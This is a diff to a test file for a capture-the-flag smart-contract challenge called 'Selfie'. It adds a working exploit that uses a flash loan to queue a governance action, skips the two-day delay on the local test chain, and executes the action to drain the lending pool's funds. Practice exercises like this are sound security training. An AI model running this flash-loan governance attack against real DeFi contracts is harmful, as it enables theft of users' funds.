@@ -30,7 +30,20 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //Initialize selfie attack contract
+        const SelfieAttack = await ethers.getContractFactory('SelfieAttack', deployer);
+        const selfieAttack = await SelfieAttack.deploy(this.governance.address, this.pool.address, this.token.address, attacker.address);
+        
+        //Execute flashloan 
+        await selfieAttack.connect(attacker).executeFlashLoan(TOKENS_IN_POOL);
+        const actionId = ethers.BigNumber.from(await selfieAttack.connect(attacker).actionId());
+        expect(actionId).to.be.gt(0);
+
+        //Advance time by two days
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); 
+        
+        //Execute queued action on governence to #drainAllFunds :p
+        await this.governance.connect(attacker).executeAction(actionId);
     });
 
     after(async function () {
